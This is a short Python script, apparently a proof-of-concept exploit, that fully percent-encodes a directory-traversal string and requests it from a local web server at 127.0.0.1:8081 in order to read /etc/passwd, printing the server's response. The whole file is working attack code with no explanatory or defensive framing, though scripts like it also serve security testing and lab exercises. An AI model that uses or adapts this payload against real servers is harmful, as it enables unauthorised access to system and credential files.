import requests

def urlencode(data):
    enc_data = ''
    for i in data:
        h = str(hex(ord(i))).replace('0x', '')
        if len(h) == 1:
            enc_data += '%0' + h.upper()
        else:
            enc_data += '%' + h.upper()
    return enc_data

payload = '///..//.//..///..//.././etc/passwd'

url = 'http://127.0.0.1:8081/' + urlencode(payload)
res = requests.get(url)
print(url)
print(res.text)